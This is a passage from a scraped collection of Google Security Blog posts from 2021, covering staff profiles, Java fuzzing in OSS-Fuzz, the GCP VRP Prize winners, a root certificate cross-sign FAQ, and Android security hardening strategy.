network.    If you are interested in participating or learning more about #ShareTheMicInCyber, click  here .                                       Posted by Parisa Tabriz, Head of Chrome Product, Engineering and UX In an effort to showcase the breadth and depth of Black+ contributions to security and privacy fields, we’ve launched a profile series that aims to elevate and celebrate the Black+ voices in security and privacy we have here at Google.Brooke Pearson manages the Privacy Sandbox program at Google, and her team's mission is to, “Create a thriving web ecosystem that is respectful of users and private by default.” Brooke lives this mission and it is what makes her an invaluable asset to the Chrome team and Google. In addition to her work advancing the fields of security and privacy, she is a fierce advocate for women in the workplace and for elevating the voices of her fellow Black+ practitioners in security and privacy. She has participated and supported the #ShareTheMicInCyber campaign since its inception. Brooke is passionate about delivering privacy solutions that work and making browsing the web an inherently more private experience for users around the world.Why do you work in security or privacy? I work in security and privacy to protect people and their personal information. It’s that simple. Security and privacy are two issues that are core to shaping the future of technology and how we interact with each other over the Internet. The challenges are immense, and yet the ability to impact positive change is what drew me to the field.Tell us a little bit about your career journey to GoogleMy career journey into privacy does not involve traditional educational training in the field. In fact, my background is in public policy and communications, but when I transitioned to the technology industry, I realized that the most pressing policy issues for companies like Google surround the nascent field of privacy and the growing field of security.After I graduated from college at Azusa Pacific University, I was the recipient of a Fulbright scholarship to Macau, where I spent one year studying Chinese and teaching English. I then moved to Washington D.C. where I initially worked for the State Department while finishing my graduate degree in International Public Policy at George Washington University. I had an amazing experience in that role and it afforded me some incredible networking opportunities and the chance to travel the world, as I worked in Afghanistan and Central Asia. After about five years in the public sector,  I joined Facebook as a Program Manager for the Global Public Policy team, initially focused on social good programs like Safety Check and Charitable Giving. Over time, I could see that the security team at Facebook was focused on fighting the proliferation of misinformation, and this called to me as an area where I could put my expertise in communication and geopolitical policy to work. So I switched teams and I've been in the security and privacy field ever since, eventually for Uber and now with Google's Chrome team. At Google, privacy and security are at the heart of everything we do. Chrome is tackling some of the world's biggest security and privacy problems, and everyday my work impacts billions of people around the world. Most days, that's pretty daunting, but every day it's humbling and inspiring.What is your security or privacy \"soapbox\"? If we want to encourage people to engage in more secure behavior, we have to make it easy to understand and easy to act on. Every day we strive to make our users safer with Google by implementing security and privacy controls that are effective and easy for our users to use and understand.As a program manager, I’ve learned that it is almost always more effective to offer a carrot than a stick, when it comes to security and privacy hygiene.  I encourage all of our users to visit our Safety Center to learn all the ways Google helps you stay safe online, every day.If you are interested in following Brooke’s work here at Google and beyond, please follow her on Twitter @brookelenet. We will be bringing you more profiles over the coming weeks and we hope you will engage with and share these with your network. If you are interested in participating or learning more about #ShareTheMicInCyber, click here.      ", "date": "March 11, 2021"},
{"website": "Google-Security", "title": "\nFuzzing Java in OSS-Fuzz\n", "author": [], "link": "https://security.googleblog.com/2021/03/fuzzing-java-in-oss-fuzz.html", "abstract": "                            Posted by Jonathan Metzman, Google Open Source Security Team   OSS-Fuzz , Google&#8217;s open source fuzzing service, now supports  fuzzing  applications written in Java and other  Java Virtual Machine (JVM)  based languages (e.g. Kotlin, Scala, etc.). Open source projects written in JVM based languages can add their project to OSS-Fuzz by following  our documentation .  The Google Open Source Security team partnered with  Code Intelligence  to integrate their  Jazzer  fuzzer with OSS-Fuzz. Thanks to their integration, open source projects written in JVM-based languages can now use OSS-Fuzz for continuous fuzzing.  OSS-Fuzz has found  more than 25,000  bugs in open source projects using fuzzing. We look forward to seeing how this technique can help secure and improve code written in JVM-based languages.     What can Jazzer do?    Jazzer allows users to fuzz code written in JVM-based languages with  libFuzzer , as they already can for code written in C/C++. It does this by providing code coverage feedback from JVM bytecode to libFuzzer. Jazzer already supports important libFuzzer features such as:     FuzzedDataProvider  for fuzzing code that doesn&#8217;t accept an array of bytes.  Evaluation of code coverage based on 8-bit edge counters.   Value profile .  Minimization of crashing inputs.  The intent for Jazzer is to support all libFuzzer features eventually.      What Does Jazzer Support?    Jazzer supports all languages that compile to JVM bytecode, since instrumentation is done on the bytecode level. This includes:   Java  Kotlin  Scala  Clojure  Jazzer can also provide coverage feedback from native code that is executed through JNI. This can uncover interesting memory corruption vulnerabilities in memory unsafe native code.      Why Fuzz Java/JVM-based Code?    As discussed in  our post on Atheris , fuzzing code written in memory safe languages, such as JVM-based languages, is useful for finding bugs where code behaves incorrectly or crashes. Incorrect behavior can be just as dangerous as memory corruption. For example, Jazzer was used to find  CVE-2021-23899  in json-sanitizer which could be exploited for  cross-site scripting (XSS) .  Bugs causing crashes or incorrect exceptions can sometimes be used for denial of service. For example, OSS-Fuzz recently found a denial of service issue that could have been used to take &#8220; a major part of the ethereum network offline &#8221;.  When fuzzing memory safe code, you can use the same classic approach for fuzzing memory unsafe code: passing mutated input to code and waiting for crashes. Or you can take a more unit test like approach where your fuzzer verifies that the code is behaving correctly ( example ).  Another way fuzzing can find interesting bugs in JVM-based code is through differential fuzzing. With differential fuzzing, your fuzzer passes mutated input from the fuzzer to multiple library implementations that should have the same functionality. Then it compares the results from each library to find differences. Check out  our documentation  to get started. We will explore this more during our OSS-Fuzz talk at  FuzzCon Europe .                                    Posted by Jonathan Metzman, Google Open Source Security TeamOSS-Fuzz, Google’s open source fuzzing service, now supports fuzzing applications written in Java and other Java Virtual Machine (JVM) based languages (e.g. Kotlin, Scala, etc.). Open source projects written in JVM based languages can add their project to OSS-Fuzz by following our documentation.The Google Open Source Security team partnered with Code Intelligence to integrate their Jazzer fuzzer with OSS-Fuzz. Thanks to their integration, open source projects written in JVM-based languages can now use OSS-Fuzz for continuous fuzzing.OSS-Fuzz has found more than 25,000 bugs in open source projects using fuzzing. We look forward to seeing how this technique can help secure and improve code written in JVM-based languages.What can Jazzer do?Jazzer allows users to fuzz code written in JVM-based languages with libFuzzer, as they already can for code written in C/C++. It does this by providing code coverage feedback from JVM bytecode to libFuzzer. Jazzer already supports important libFuzzer features such as:FuzzedDataProvider for fuzzing code that doesn’t accept an array of bytes.Evaluation of code coverage based on 8-bit edge counters.Value profile.Minimization of crashing inputs.The intent for Jazzer is to support all libFuzzer features eventually.What Does Jazzer Support?Jazzer supports all languages that compile to JVM bytecode, since instrumentation is done on the bytecode level. This includes:JavaKotlinScalaClojureJazzer can also provide coverage feedback from native code that is executed through JNI. This can uncover interesting memory corruption vulnerabilities in memory unsafe native code.Why Fuzz Java/JVM-based Code?As discussed in our post on Atheris, fuzzing code written in memory safe languages, such as JVM-based languages, is useful for finding bugs where code behaves incorrectly or crashes. Incorrect behavior can be just as dangerous as memory corruption. For example, Jazzer was used to find CVE-2021-23899 in json-sanitizer which could be exploited for cross-site scripting (XSS).  Bugs causing crashes or incorrect exceptions can sometimes be used for denial of service. For example, OSS-Fuzz recently found a denial of service issue that could have been used to take “a major part of the ethereum network offline”.When fuzzing memory safe code, you can use the same classic approach for fuzzing memory unsafe code: passing mutated input to code and waiting for crashes. Or you can take a more unit test like approach where your fuzzer verifies that the code is behaving correctly (example).Another way fuzzing can find interesting bugs in JVM-based code is through differential fuzzing. With differential fuzzing, your fuzzer passes mutated input from the fuzzer to multiple library implementations that should have the same functionality. Then it compares the results from each library to find differences.Check out our documentation to get started. We will explore this more during our OSS-Fuzz talk at FuzzCon Europe.     ", "date": "March 10, 2021"},
{"website": "Google-Security", "title": "\nAnnouncing the winners of the 2020 GCP VRP Prize \n", "author": ["Posted by Harshvardhan Sharma, Information Security Engineer, Google "], "link": "https://security.googleblog.com/2021/03/announcing-winners-of-2020-gcp-vrp-prize.html", "abstract": "                             Posted by Harshvardhan Sharma, Information Security Engineer, Google&nbsp;      We first  announced  the GCP VRP Prize in 2019 to encourage security researchers to focus on the security of Google Cloud Platform (GCP), in turn helping us make GCP more secure for our users, customers, and the internet at large. In the  first iteration  of the prize, we awarded $100,000 to the winning write-up about a security vulnerability in GCP. We also announced that we would reward the top 6 submissions in 2020 and increased the total prize money to $313,337.    2020 turned out to be an  amazing year  for the Google Vulnerability Reward Program. We received many high-quality vulnerability reports from our talented and prolific vulnerability researchers.            Vulnerability reports received year-over-year      This trend was reflected in the submissions we received for the GCP VRP Prize. After careful evaluation of the many innovative and high-impact vulnerability write-ups we received this year, we are excited to announce the winners of the 2020 GCP VRP Prize:   First Prize, $133,337: Ezequiel Pereira for the report and write-up  RCE in Google Cloud Deployment Manager . The bug discovered by Ezequiel allowed him to make requests to internal Google services, authenticated as a privileged service account. Here's a video that gives more details about the bug and the discovery process.         Second Prize, $73,331: David Nechuta for the report and write-up  31k$ SSRF in Google Cloud Monitoring led to metadata exposure . David found a Server-side Request Forgery (SSRF) bug in Google Cloud Monitoring's uptime check feature. The bug could have been used to leak the authentication token of the service account used for these checks.  Third Prize, $73,331:  Dylan Ayrey and Allison Donovan for the report and write-up  Fixing a Google Vulnerability . They pointed out issues in the default permissions associated with some of the service accounts used by GCP services.  Fourth Prize, $31,337: Bastien Chatelard for the report and write-up  Escaping GKE gVisor sandboxing using metadata . Bastien discovered a bug in the GKE gVisor sandbox's network policy implementation due to which the Google Compute Engine metadata API was accessible.&nbsp;  Fifth Prize, $1,001: Brad Geesaman for the report and write-up  CVE-2020-15157 \"ContainerDrip\" Write-up . The bug could allow an attacker to trick containerd into leaking instance metadata by supplying a malicious container image manifest.  Sixth Prize, $1,000:  Chris Moberly for the report and write-up  Privilege Escalation in Google Cloud Platform's OS Login . The report demonstrates how an attacker can use DHCP poisoning to escalate their privileges on a Google Compute Engine VM.  Congratulations to all the winners! If we have piqued your interest and you would like to enter the competition for a GCP VRP Prize in 2021, here&#8217;s a reminder on the requirements.    Find a vulnerability in a GCP product (check out  Google Cloud Free Program  to get started)  Report it to the  VRP  (you might get rewarded for it on top of the GCP VRP Prize!)  Create a public write-up  Submit it  here   Make sure to submit your VRP reports and write-ups before December 31, 2021 at 11:59 GMT. Good luck! You can learn more about the prize for this year  here . We can't wait to see what our talented vulnerability researchers come up with this year!                                    Posted by Harshvardhan Sharma, Information Security Engineer, Google We first announced the GCP VRP Prize in 2019 to encourage security researchers to focus on the security of Google Cloud Platform (GCP), in turn helping us make GCP more secure for our users, customers, and the internet at large. In the first iteration of the prize, we awarded $100,000 to the winning write-up about a security vulnerability in GCP. We also announced that we would reward the top 6 submissions in 2020 and increased the total prize money to $313,337.2020 turned out to be an amazing year for the Google Vulnerability Reward Program. We received many high-quality vulnerability reports from our talented and prolific vulnerability researchers. Vulnerability reports received year-over-yearThis trend was reflected in the submissions we received for the GCP VRP Prize. After careful evaluation of the many innovative and high-impact vulnerability write-ups we received this year, we are excited to announce the winners of the 2020 GCP VRP Prize:First Prize, $133,337: Ezequiel Pereira for the report and write-up RCE in Google Cloud Deployment Manager. The bug discovered by Ezequiel allowed him to make requests to internal Google services, authenticated as a privileged service account. Here's a video that gives more details about the bug and the discovery process.Second Prize, $73,331: David Nechuta for the report and write-up 31k$ SSRF in Google Cloud Monitoring led to metadata exposure. David found a Server-side Request Forgery (SSRF) bug in Google Cloud Monitoring's uptime check feature. The bug could have been used to leak the authentication token of the service account used for these checks.Third Prize, $73,331:  Dylan Ayrey and Allison Donovan for the report and write-up Fixing a Google Vulnerability. They pointed out issues in the default permissions associated with some of the service accounts used by GCP services.Fourth Prize, $31,337: Bastien Chatelard for the report and write-up Escaping GKE gVisor sandboxing using metadata. Bastien discovered a bug in the GKE gVisor sandbox's network policy implementation due to which the Google Compute Engine metadata API was accessible. Fifth Prize, $1,001: Brad Geesaman for the report and write-up CVE-2020-15157 \"ContainerDrip\" Write-up. The bug could allow an attacker to trick containerd into leaking instance metadata by supplying a malicious container image manifest.Sixth Prize, $1,000:  Chris Moberly for the report and write-up Privilege Escalation in Google Cloud Platform's OS Login. The report demonstrates how an attacker can use DHCP poisoning to escalate their privileges on a Google Compute Engine VM.Congratulations to all the winners! If we have piqued your interest and you would like to enter the competition for a GCP VRP Prize in 2021, here’s a reminder on the requirements.Find a vulnerability in a GCP product (check out Google Cloud Free Program to get started)Report it to the VRP (you might get rewarded for it on top of the GCP VRP Prize!)Create a public write-upSubmit it hereMake sure to submit your VRP reports and write-ups before December 31, 2021 at 11:59 GMT. Good luck! You can learn more about the prize for this year here. We can't wait to see what our talented vulnerability researchers come up with this year!     ", "date": "March 17, 2021"},
{"website": "Google-Security", "title": "\n Google, HTTPS, and device compatibility\n", "author": [], "link": "https://security.googleblog.com/2021/03/google-https-and-device-compatibility.html", "abstract": "                               Posted by Ryan Hurst, Product Management, Google Trust Services      Encryption is a fundamental building block when you&#8217;re on a mission to organize the world&#8217;s information and make it universally accessible with strong security and privacy. This is why a little over four years ago we created  Google Trust Services &#8212;our publicly trusted Certificate Authority (CA).  The road to becoming a publicly trusted certificate authority is a long one -  especially if the certificates you issue will be used by some of the most visited sites on the internet.   When we started on this journey, our goal was that within five years our root certificates would be embedded in enough devices that we could do a single transition to our long-term root certificates.   There are still a large number of active used devices that have not been updated with our root certificates.  To ensure as many clients as possible continue to have secure connections when using Google Trust Services certificates, we needed to obtain a cross-sign. A cross-sign allows a certificate authority that is already trusted by a device to extend its device compatibility to another certificate authority.   The rules governing public CA operations require that the CA being cross-signed meet the same strict operational, technological, and audit criteria as the certificate authority providing this cross-sign. Google Trust Services is already a publicly trusted CA that is operated to the highest standards and is in all major browser trust stores, so we already met the requirements for a cross-sign from another CA.. The key was to find one that is already trusted by the devices we wanted to be able to validate our certificates. We worked with GMO GlobalSign for this cross sign because they operate one of the oldest root certificates in wide use today.  Why are we telling you about this now? On December 15, 2021, the primary root certificate we use today ( GlobalSign R2  which is owned and operated by Google Trust Services) will expire.   To ensure these older devices continue to work smoothly with the certificates we issue we will start sending a new cross-signed certificate to services when we issue new certificates.   The good news is that users shouldn&#8217;t notice the change. This is because the cross-certificate ( GTS Root R1 Cross ) we're deploying was signed by a  root certificate created and trusted by most devices over 20 years ago .  In summary, when you use certificates from Google Trust Services, you and your customers will continue to get the benefit of the best device compatibility in the industry.  We know you might have some questions about this change. Here are our answers to the most frequent ones:    I am a developer or ISV that uses a Google API. What do I need to do?       Certificate Authorities change which root CA certificates they use from time to time, so we have always provided a list of  certificates that we currently use or may use in the future . Anybody using this list won&#8217;t have to change anything. If you have not been using this list and updating it based on our published guidance, you will need to update your application to use these roots and regularly update the list you use so future changes go smoothly for your users.   I am a website operator that uses Google Trust Services certificates. Do I need to change anything?       You do not! Google Trust Services offers certificates to Alphabet products and services including many Google Cloud services. This means that those services are the ones responsible for configuring and managing TLS for you.    When will this change go into effect?&nbsp;        We will begin rolling out certificate chains that use this cross-certificate in March 2021. We will slowly roll these changes out throughout the rest of the year and will complete them before December 15, 2021.  I use a service or product that uses Google Trust Services. Is there anything I need to change? No, this change should be invisible to all end users.   How can I test to see if my devices will trust certificates that rely on this cross-sign?&nbsp;        We operate a test site that uses the cross-certificate that you can visit  here . If you see \"Google Trust Services Demo Page - Expected Status: good\" and some additional certificate information, the new certificate chain works correctly on your device. If you get an error, the list of trusted roots for the device you're testing needs to be updated.   When does this cross-certificate expire and what happens when it does?&nbsp;        The cross-certificate expires January 28th, 2028. Sometime between now and when it looks like it is no longer needed for broad device compatibility, we will stop providing this extra certificate to certificate requesters, as it will no longer be needed.   I use an old device and it does not trust the cross-sign. What should I do?&nbsp;        Many devices handle root certificate updates as part of their security patching process. If you are running one of these devices, you should make sure you apply all relevant security updates. It is also possible the manufacturer no longer provides security updates for your device. If this is the case you may want to contact your provider or consider replacing your device.  Does this mean you are no longer using the Google Trust Services roots? We are still using the Google Trust Services roots, they are simply cross-signed. When it is no longer necessary to use the cross-sign, we will no longer distribute the cross-sign to certificate requestors.     To learn more, visit  Google Trust Services .                                      Posted by Ryan Hurst, Product Management, Google Trust ServicesEncryption is a fundamental building block when you’re on a mission to organize the world’s information and make it universally accessible with strong security and privacy. This is why a little over four years ago we created Google Trust Services—our publicly trusted Certificate Authority (CA).The road to becoming a publicly trusted certificate authority is a long one -  especially if the certificates you issue will be used by some of the most visited sites on the internet. When we started on this journey, our goal was that within five years our root certificates would be embedded in enough devices that we could do a single transition to our long-term root certificates. There are still a large number of active used devices that have not been updated with our root certificates.To ensure as many clients as possible continue to have secure connections when using Google Trust Services certificates, we needed to obtain a cross-sign. A cross-sign allows a certificate authority that is already trusted by a device to extend its device compatibility to another certificate authority. The rules governing public CA operations require that the CA being cross-signed meet the same strict operational, technological, and audit criteria as the certificate authority providing this cross-sign. Google Trust Services is already a publicly trusted CA that is operated to the highest standards and is in all major browser trust stores, so we already met the requirements for a cross-sign from another CA.. The key was to find one that is already trusted by the devices we wanted to be able to validate our certificates. We worked with GMO GlobalSign for this cross sign because they operate one of the oldest root certificates in wide use today.Why are we telling you about this now? On December 15, 2021, the primary root certificate we use today (GlobalSign R2 which is owned and operated by Google Trust Services) will expire. To ensure these older devices continue to work smoothly with the certificates we issue we will start sending a new cross-signed certificate to services when we issue new certificates. The good news is that users shouldn’t notice the change. This is because the cross-certificate (GTS Root R1 Cross) we're deploying was signed by a root certificate created and trusted by most devices over 20 years ago.In summary, when you use certificates from Google Trust Services, you and your customers will continue to get the benefit of the best device compatibility in the industry.We know you might have some questions about this change. Here are our answers to the most frequent ones: I am a developer or ISV that uses a Google API. What do I need to do? Certificate Authorities change which root CA certificates they use from time to time, so we have always provided a list of certificates that we currently use or may use in the future. Anybody using this list won’t have to change anything. If you have not been using this list and updating it based on our published guidance, you will need to update your application to use these roots and regularly update the list you use so future changes go smoothly for your users.I am a website operator that uses Google Trust Services certificates. Do I need to change anything? You do not! Google Trust Services offers certificates to Alphabet products and services including many Google Cloud services. This means that those services are the ones responsible for configuring and managing TLS for you. When will this change go into effect? We will begin rolling out certificate chains that use this cross-certificate in March 2021. We will slowly roll these changes out throughout the rest of the year and will complete them before December 15, 2021.I use a service or product that uses Google Trust Services. Is there anything I need to change? No, this change should be invisible to all end users.How can I test to see if my devices will trust certificates that rely on this cross-sign? We operate a test site that uses the cross-certificate that you can visit here. If you see \"Google Trust Services Demo Page - Expected Status: good\" and some additional certificate information, the new certificate chain works correctly on your device. If you get an error, the list of trusted roots for the device you're testing needs to be updated.When does this cross-certificate expire and what happens when it does? The cross-certificate expires January 28th, 2028. Sometime between now and when it looks like it is no longer needed for broad device compatibility, we will stop providing this extra certificate to certificate requesters, as it will no longer be needed.I use an old device and it does not trust the cross-sign. What should I do? Many devices handle root certificate updates as part of their security patching process. If you are running one of these devices, you should make sure you apply all relevant security updates. It is also possible the manufacturer no longer provides security updates for your device. If this is the case you may want to contact your provider or consider replacing your device.Does this mean you are no longer using the Google Trust Services roots? We are still using the Google Trust Services roots, they are simply cross-signed. When it is no longer necessary to use the cross-sign, we will no longer distribute the cross-sign to certificate requestors.To learn more, visit Google Trust Services.      ", "date": "March 15, 2021"},
{"website": "Google-Security", "title": "\n#ShareTheMicInCyber: Rob Duhart \n", "author": [], "link": "https://security.googleblog.com/2021/03/sharethemicincyber-rob-duhart.html", "abstract": "                            Posted by Matt Levine, Director, Risk Management    In an effort to showcase the breadth and depth of Black+ contributions to security and privacy fields, we&#8217;ve launched a  series &nbsp;in support of #ShareTheMicInCyber that aims to elevate and celebrate the Black+ voices in security and privacy we have here at Google.   Today, we will hear from Rob Duhart, he leads a cross functional team at Google that aims to enable and empower all of our products, like Chrome, Android and Maps, to mature their security risk journey.  Rob&#8217;s commitment to making the internet a safer place extends far beyond his work at Google, he is a member of the Cyber Security Executive Education Advisory Board of Directors at Washington University in St. Louis, where he helps craft the future of cyber security executive education globally. Rob also sits on the board of the  EC-Council  and has founded chapters of the  International Consortium of Cybersecurity Professionals (ICMCP)  across the country.  Rob is passionate about securing the digital world and supporting Black+, women, and underrepresented minorities across the technology landscape.          Why do you work in security or privacy?    I have been in the cyber world long enough to know how important it is for security and privacy to be top of mind and focus for organizations of all shapes and sizes. My passion lies in keeping users and Googlers safe. One of the main reasons I joined Google is its commitment to security and privacy.             Tell us a little bit about your career journey to Google...    I was fortunate to begin my cybersecurity career in the United States Government working at the Department of Energy, FBI, and the Intelligence Community. I transitioned to the private sector in 2017 and have been fortunate to lead talented security teams at Cardinal Health and Ford Motor Company.    My journey into cybersecurity was not traditional. I studied Political Science at Washington University in St. Louis, completed graduate education at George Mason University and Carnegie Mellon University. I honed my skills and expertise in this space through hands on experience and with the support of many amazing mentors. It has been the ride of a lifetime and I look forward to what is next.   To those thinking about making a career change or are just starting to get into security, my advice is don&#8217;t be afraid to ask for help.             What is your security or privacy \"soapbox\"?     At Google, we implement  a model known as Federated Security, where our security teams partner across our Product Areas to enable security program maturity Google wide. Our Federated Security team believes in harnessing the power of relationship, engagement, and community to drive maturity into every product. Security and privacy are team sports &#8211;  it takes business leaders and security leaders working together to secure and protect our digital and physical worlds.   If you are interested in following Rob&#8217;s work here at Google and beyond, please follow him on Twitter  @RobDuhart . We will be bringing you more profiles over the coming weeks and we hope you will engage with and share these with your network.    If you are interested in participating or learning more about #ShareTheMicInCyber, click  here .                                                Posted by Matt Levine, Director, Risk Management In an effort to showcase the breadth and depth of Black+ contributions to security and privacy fields, we’ve launched a series in support of #ShareTheMicInCyber that aims to elevate and celebrate the Black+ voices in security and privacy we have here at Google.Today, we will hear from Rob Duhart, he leads a cross functional team at Google that aims to enable and empower all of our products, like Chrome, Android and Maps, to mature their security risk journey.Rob’s commitment to making the internet a safer place extends far beyond his work at Google, he is a member of the Cyber Security Executive Education Advisory Board of Directors at Washington University in St. Louis, where he helps craft the future of cyber security executive education globally. Rob also sits on the board of the EC-Council and has founded chapters of the International Consortium of Cybersecurity Professionals (ICMCP) across the country.Rob is passionate about securing the digital world and supporting Black+, women, and underrepresented minorities across the technology landscape.Why do you work in security or privacy? I have been in the cyber world long enough to know how important it is for security and privacy to be top of mind and focus for organizations of all shapes and sizes. My passion lies in keeping users and Googlers safe. One of the main reasons I joined Google is its commitment to security and privacy.Tell us a little bit about your career journey to Google...I was fortunate to begin my cybersecurity career in the United States Government working at the Department of Energy, FBI, and the Intelligence Community. I transitioned to the private sector in 2017 and have been fortunate to lead talented security teams at Cardinal Health and Ford Motor Company.  My journey into cybersecurity was not traditional. I studied Political Science at Washington University in St. Louis, completed graduate education at George Mason University and Carnegie Mellon University. I honed my skills and expertise in this space through hands on experience and with the support of many amazing mentors. It has been the ride of a lifetime and I look forward to what is next. To those thinking about making a career change or are just starting to get into security, my advice is don’t be afraid to ask for help.What is your security or privacy \"soapbox\"?  At Google, we implement  a model known as Federated Security, where our security teams partner across our Product Areas to enable security program maturity Google wide. Our Federated Security team believes in harnessing the power of relationship, engagement, and community to drive maturity into every product. Security and privacy are team sports –  it takes business leaders and security leaders working together to secure and protect our digital and physical worlds. If you are interested in following Rob’s work here at Google and beyond, please follow him on Twitter @RobDuhart. We will be bringing you more profiles over the coming weeks and we hope you will engage with and share these with your network. If you are interested in participating or learning more about #ShareTheMicInCyber, click here.      ", "date": "March 1, 2021"},
{"website": "Google-Security", "title": "\n Data Driven Security Hardening in Android\n", "author": ["Posted by Kevin Deus, Joel Galenson, Billy Lau and Ivan Lozano, Android Security & Privacy Team"], "link": "https://security.googleblog.com/2021/01/data-driven-security-hardening-in.html", "abstract": "                             Posted by Kevin Deus, Joel Galenson, Billy Lau and Ivan Lozano, Android Security &amp; Privacy Team         The Android platform team is committed to securing Android for every user across every device. In addition to  monthly security updates  to patch vulnerabilities reported to us through our  Vulnerability Rewards Program (VRP) , we also proactively architect Android to protect against undiscovered vulnerabilities through hardening measures such as applying  compiler-based mitigations  and improving sandboxing. This post focuses on the decision-making process that goes into these proactive measures: in particular, how we choose which hardening techniques to deploy and where they are deployed. As device capabilities vary widely within the Android ecosystem, these decisions must be made carefully, guided by data available to us to maximize the value to the ecosystem as a whole.     The overall approach to Android Security is multi-pronged and leverages several principles and techniques to arrive at data-guided solutions to make future exploitation more difficult. In particular, when it comes to hardening the platform, we try to answer the following questions:         What data are available and how can they guide security decisions?     What mitigations are available, how can they be improved, and where should they be enabled?     What are the deployment challenges of particular mitigations and what tradeoffs are there to consider?        By shedding some light on the process we use to choose security features for Android, we hope to provide a better understanding of Android's overall approach to protecting our users.    Data-driven security decision-making      We use a variety of sources to determine what areas of the platform would benefit the most from different types of security mitigations. The  Android Vulnerability Rewards Program  (VRP) is one very informative source: all vulnerabilities submitted through this program are analyzed by our security engineers to determine the root cause of each vulnerability and its overall severity (based on  these guidelines ). Other sources are internal and external bug-reports, which identify vulnerable components and reveal coding practices that commonly lead to errors. Knowledge of problematic code patterns combined with the prevalence and severity of the vulnerabilities they cause can help inform decisions about which mitigations are likely to be the most beneficial.                  Types of Critical and High severity vulnerabilities fixed in Android Security Bulletins in 2019      Relying purely on vulnerability reports is not sufficient as the data are inherently biased: often, security researchers flock to \"hot\" areas, where other researchers have already found vulnerabilities (e.g.  Stagefright ). Or they may focus on areas where readily-available tools make it easier to find bugs (for instance, if a security research tool is posted to Github, other researchers commonly utilize that tool to explore deeper).     To ensure that mitigation efforts are not biased only toward areas where bugs and vulnerabilities have been reported, internal Red Teams analyze less scrutinized or more complex parts of the platform. Also, continuous automated fuzzers run at-scale on both Android virtual machines and physical devices. This also ensures that bugs can be found and fixed early in the development lifecycle. Any vulnerabilities uncovered through this process are also analyzed for root cause and severity, which inform mitigation deployment decisions.     The Android VRP rewards submissions of  full exploit-chains  that demonstrate a full end-to-end attack. These exploit-chains, which generally utilize multiple vulnerabilities, are very informative in demonstrating techniques that attackers use to chain vulnerabilities together to accomplish their goals. Whenever a researcher submits a full exploit chain, a team of security engineers analyzes and documents the overall approach, each link in the chain, and any innovative attack strategies used. This analysis informs which exploit mitigation strategies could be employed to prevent pivoting directly from one vulnerability to another (some examples include  Address Space Layout Randomization  and  Control-Flow Integrity ) and whether the process&#8217;s attack surface could be reduced if it has unnecessary access to resources.     There are often multiple different ways to use a collection of vulnerabilities to create an exploit chain. Therefore a defense-in-depth approach is beneficial, with the goal of reducing the usefulness of some vulnerabilities and lengthening exploit chains so that successful exploitation requires more vulnerabilities. This increases the cost for an attacker to develop a full exploit chain.     Keeping up with developments in the wider security community helps us understand the current threat landscape, what techniques are currently used for exploitation, and what future trends look like. This involves but is not limited to:       Close collaboration with the external security research community    Reading journals and attending conferences    Monitoring techniques used by malware    Following security research trends in security communities    Participating in external efforts and projects such as  KSPP , syzbot, LLVM, Rust, and more       All of these data sources provide feedback for the overall security hardening strategy, where new mitigations should be deployed, and what existing security mitigations should be improved.     Reasoning About Security Hardening        Hardening and Mitigations        Analyzing the data reveals areas where broader mitigations can eliminate entire classes of vulnerabilities.  For instance, if parts of the platform show a large number of vulnerabilities due to integer overflow bugs, they are good candidates to enable Undefined Behavior Sanitizer ( UBSan ) mitigations such as the Integer Overflow Sanitizer.  When common patterns in memory access vulnerabilities appear, they inform efforts to build  hardened memory allocators  (enabled by default in  Android 11 ) and implement mitigations (such as  CFI ) against exploitation techniques that provide better resilience against memory overflows or Use-After-Free vulnerabilities.     Before discussing how the data can be used, it is important to understand how we classify our overall efforts in hardening the platform. There are a few broadly defined buckets that hardening techniques and mitigations fit into (though sometimes a particular mitigation may not fit cleanly into any single one):        Exploit mitigations         Deterministic runtime prevention of vulnerabilities  detects undefined or unexpected behavior and aborts execution when the behavior is detected. This turns potential memory corruption vulnerabilities into less harmful crashes. Often these mitigations can be enabled selectively and still be effective because they impact individual bugs. Examples include  Integer Sanitizer  and  Bounds Sanitizer .      Exploitation technique mitigations  target the techniques used to pivot from one vulnerability to another or to gain code execution. These mitigations theoretically may render some vulnerabilities useless, but more often serve to constrain the actions available to attackers seeking to exploit vulnerabilities. This increases the difficulty of exploit development in terms of time and resources. These mitigations may need to be enabled across an entire process's memory space to be effective. Examples include Address Space Layout Randomization, Control Flow Integrity (CFI), Stack Canaries and Memory Tagging.      Compiler transformations  that change undefined behavior to defined behavior at compile-time. This prevents attackers from taking advantage of undefined behavior such as  uninitialized memory . An example of this is stack initialization.          Architectural decomposition        Splits larger, more privileged components into smaller pieces, each of which has fewer privileges than the original. After this decomposition, a vulnerability in one of the smaller components will have reduced severity by providing less access to the system, lengthening exploit chains, and making it harder for an attacker to gain access to sensitive data or additional privilege escalation paths.          Sandboxing/isolation        Related to architectural decomposition, enforces a minimal set of permissions/capabilities that a process needs to correctly function, often through mandatory and/or discretionary access control. Like architectural decomposition, this makes vulnerabilities in these processes less valuable as there are fewer things attackers can do in that execution context, by applying the principle of least privilege. Some examples are  Android Permissions ,  Unix Permissions ,  Linux Capabilities ,  SELinux , and  Seccomp .          Migrating to memory-safe languages        C and C++ do not provide memory safety the way that languages like Java, Kotlin, and Rust do. Given that the  majority  of security vulnerabilities reported to Android are memory safety issues, a two-pronged approach is applied: improving the safety of C/C++ while also encouraging the use of memory safe languages.             Enabling these mitigations       With the broad arsenal of mitigation techniques available, which of these to employ and where to apply them depends on the type of problem being solved. For instance, a monolithic process that handles a lot of untrusted data and does complex parsing would be a good candidate for all of these. The media frameworks provide an excellent historical example where an architectural decomposition enabled incrementally turning on more exploit mitigations and deprivileging.              Architectural decomposition and isolation of the Media Frameworks over time      Remotely reachable attack surfaces such as NFC, Bluetooth, WiFi, and media components have historically housed the most severe vulnerabilities, and as such these components are also prioritized for hardening. These components often contain some of the most common vulnerability root causes that are reported in the VRP, and we have recently enabled sanitizers in all of them.     Libraries and processes that enforce or sit at security boundaries, such as  libbinder , and widely-used core libraries such as  libui ,  libcore , and  libcutils  are good targets for exploit mitigations since these are not process-specific. However, due to performance and stability sensitivities around these core libraries, mitigations need to be supported by strong evidence of their security impact.      Finally, the kernel&#8217;s high level of privilege makes it an important target for hardening as well. Because different codebases have different characteristics and functionality, susceptibility to and prevalence of certain kinds of vulnerabilities will differ. Stability and performance of mitigations here are exceptionally important to avoid negatively impacting the user experience, and some mitigations that make sense to deploy in user space may not be applicable or effective. Therefore our considerations for which hardening strategies to employ in the kernel are based on a separate analysis of the available kernel-specific data.      This data-driven approach has led to tangible and measurable results. Starting in 2015 with Stagefright, a large number of  Critical severity  vulnerabilities were reported in Android's media framework. These were 